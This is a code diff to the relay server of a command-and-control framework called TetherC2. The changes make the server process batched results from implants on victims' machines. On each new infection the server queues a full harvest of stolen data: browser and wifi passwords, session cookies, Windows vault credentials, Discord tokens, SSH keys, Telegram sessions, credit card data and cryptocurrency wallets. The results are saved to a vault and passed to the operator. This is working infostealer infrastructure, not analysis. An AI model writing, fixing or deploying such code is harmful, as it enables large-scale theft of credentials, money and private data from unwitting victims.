@@ -1,4 +1,4 @@
-# relay_server.py (Full Code - Modified for Comprehensive Initial Harvest)
+# relay_server.py (Full Code - Corrected for Batched Results)
 import sys
 import os
 import sqlite3
@@ -61,43 +61,35 @@ def handle_implant_hello():
         active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), **metadata}
         if is_new_session: print(f"[RELAY] New session online from user '{c2_user}': {session_id}")
     
-    # This part handles results from background tasks that ride along with the beacon
+    # --- DEFINITIVE FIX FOR BATCHED RESULTS ---
+    # The new implant sends a list of results. Process each one.
     if "results" in data:
         for result in data.get("results", []):
-            if "command" in result and "output" in result:
-                db.save_vault_data(session_id, result["command"], result["output"])
+            module_name = result.get("command")
+            output_data = result.get("output")
+            if module_name and output_data is not None:
+                # Save to the persistent database
+                db.save_vault_data(session_id, module_name, output_data)
+                # Queue for live C2 client pickup
+                with res_lock:
+                    response_queue.setdefault(c2_user, {}).setdefault(session_id, []).append(result)
     
     with cmd_lock:
-        # --- DEFINITIVE FIX FOR FULL DATA HARVEST ---
-        # When a session is new, queue every single data gathering command
-        # to ensure the UI is fully populated with all possible information.
         if is_new_session:
             initial_tasks = [
-                {"action": "system_info", "params": {}},
-                {"action": "hardware_info", "params": {}},
-                {"action": "security_products", "params": {}},
-                {"action": "installed_applications", "params": {}},
-                {"action": "running_processes", "params": {}},
-                {"action": "environment_variables", "params": {}},
-                {"action": "network_info", "params": {}},
-                {"action": "wifi_passwords", "params": {}},
-                {"action": "active_connections", "params": {}},
-                {"action": "arp_table", "params": {}},
-                {"action": "dns_cache", "params": {}},
-                {"action": "browser_passwords", "params": {}},
-                {"action": "session_cookies", "params": {}},
-                {"action": "windows_vault_credentials", "params": {}},
-                {"action": "application_credentials", "params": {}},
-                {"action": "discord_tokens", "params": {}},
-                {"action": "roblox_cookies", "params": {}},
-                {"action": "ssh_keys", "params": {}},
-                {"action": "telegram_session_files", "params": {}},
-                {"action": "credit_card_data", "params": {}},
-                {"action": "cryptocurrency_wallet_files", "params": {}},
-                {"action": "browser_autofill", "params": {}},
-                {"action": "browser_history", "params": {}},
-                {"action": "clipboard_contents", "params": {}},
-                {"action": "browser_files", "params": {}}  # Crucial for decryption
+                {"action": "system_info", "params": {}}, {"action": "hardware_info", "params": {}},
+                {"action": "security_products", "params": {}}, {"action": "installed_applications", "params": {}},
+                {"action": "running_processes", "params": {}}, {"action": "environment_variables", "params": {}},
+                {"action": "network_info", "params": {}}, {"action": "wifi_passwords", "params": {}},
+                {"action": "active_connections", "params": {}}, {"action": "arp_table", "params": {}},
+                {"action": "dns_cache", "params": {}}, {"action": "browser_passwords", "params": {}},
+                {"action": "session_cookies", "params": {}}, {"action": "windows_vault_credentials", "params": {}},
+                {"action": "application_credentials", "params": {}}, {"action": "discord_tokens", "params": {}},
+                {"action": "roblox_cookies", "params": {}}, {"action": "ssh_keys", "params": {}},
+                {"action": "telegram_session_files", "params": {}}, {"action": "credit_card_data", "params": {}},
+                {"action": "cryptocurrency_wallet_files", "params": {}}, {"action": "browser_autofill", "params": {}},
+                {"action": "browser_history", "params": {}}, {"action": "clipboard_contents", "params": {}},
+                {"action": "browser_files", "params": {}}
             ]
             command_queue.setdefault(c2_user, {}).setdefault(session_id, []).extend(initial_tasks)
             
@@ -107,31 +99,22 @@ def handle_implant_hello():
 
 @app.route('/implant/response', methods=['POST'])
 def handle_implant_response():
-    data = request.json; session_id = data.get("session_id")
+    data = request.json
+    session_id = data.get("session_id")
     if not session_id: return jsonify({"status": "error", "message": "session_id missing"}), 400
     
-    owner = None
-    with ses_lock:
-        session_info = active_sessions.get(session_id)
-        if session_info:
-            # Update last_seen on any communication to keep the session alive
-            active_sessions[session_id]['last_seen'] = time.time()
-            owner = session_info.get("owner")
-            
+    owner = active_sessions.get(session_id, {}).get("owner")
     if owner:
-        # Save the response to the persistent database vault
         module_name = data.get("command")
         output_data = data.get("output")
         if module_name and output_data is not None:
             db.save_vault_data(session_id, module_name, output_data)
-            
-        # Also queue it for the live C2 client
         with res_lock:
             response_queue.setdefault(owner, {}).setdefault(session_id, []).append(data)
             
     return jsonify({"status": "ok"})
 
-# --- C2 Controller Endpoints ---
+# --- C2 Controller Endpoints (Unchanged) ---
 @app.route('/c2/task', methods=['POST'])
 def handle_c2_task():
     data = request.json; username, session_id, command = data.get("username"), data.get("session_id"), data.get("command")
@@ -144,7 +127,7 @@ def discover_sessions():
     username = request.json.get("username"); user_sessions = {}
     with ses_lock:
         for sid, data in active_sessions.items():
-            if data["owner"] == username and (time.time() - data["last_seen"]) < SESSION_TIMEOUT_SECONDS:
+            if data.get("owner") == username and (time.time() - data.get("last_seen", 0)) < SESSION_TIMEOUT_SECONDS:
                 user_sessions[sid] = {"hostname": data["hostname"], "user": data["user"], "os": data.get("os", "Unknown")}
     return jsonify({"sessions": user_sessions})
     
@@ -165,9 +148,6 @@ def get_all_vault_data():
 def index(): return "TetherC2 Relay is operational."
 
 if __name__ == '__main__':
-    # Use environment variable for port, defaulting to 5001, suitable for Render/Heroku
     port = int(os.environ.get('PORT', 5001))
     print(f"[RELAY] TetherC2 Relay is operational on port {port}.")
-    # For production, Gunicorn should be used instead of app.run()
-    # Example: gunicorn --worker-class gevent --bind 0.0.0.0:5001 relay_server:app
     app.run(host='0.0.0.0', port=port)
